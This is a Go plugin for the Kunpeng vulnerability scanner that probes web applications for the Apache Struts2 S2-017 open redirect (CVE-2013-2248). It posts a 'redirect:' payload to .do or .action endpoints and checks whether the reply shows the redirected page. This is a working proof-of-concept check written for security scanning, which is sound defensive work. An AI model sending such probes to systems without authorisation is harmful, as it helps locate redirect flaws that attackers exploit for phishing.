package goplugin

import (
	"net/http"
	"regexp"
	"strings"

	"github.com/opensec-cn/kunpeng/plugin"
	"github.com/opensec-cn/kunpeng/util"
)

type struts2_17 struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("struts2", &struts2_17{})
}
func (d *struts2_17) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "Struts2 s2-017 URL跳转",
		Remarks: `In Struts 2 before 2.3.15.1 the information following "redirect:" or "redirectAction:" can easily be manipulated to redirect to an arbitrary location.`,
		Level:   3,
		Type:    "URLJUMP",
		Author:  "wolf",
		References: plugin.References{
			URL:  "https://cwiki.apache.org/confluence/display/WW/S2-017",
			CVE:  "CVE-2013-2248",
			KPID: "KP-0037",
		},
	}
	return d.info
}
func (d *struts2_17) GetResult() []plugin.Plugin {
	var result = d.result
	d.result = []plugin.Plugin{}
	return result
}
func (d *struts2_17) Check(URL string, meta plugin.TaskMeta) (b bool) {
	poc := "redirect:https://www.apple.com/contact/"
	var checkURL string
	for _, url := range meta.FileList {
		if ok, _ := regexp.MatchString(`\.(do|action)$`, url); ok {
			checkURL = url
			break
		}
	}
	if checkURL == "" {
		return false
	}
	request, err := http.NewRequest("POST", checkURL, strings.NewReader(poc))
	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if err != nil {
		return false
	}
	resp, err := util.RequestDo(request, true)
	if err != nil {
		return false
	}
	if strings.Contains(resp.ResponseRaw, "Contacting Apple") {
		result := d.info
		result.Response = resp.ResponseRaw
		result.Request = resp.RequestRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
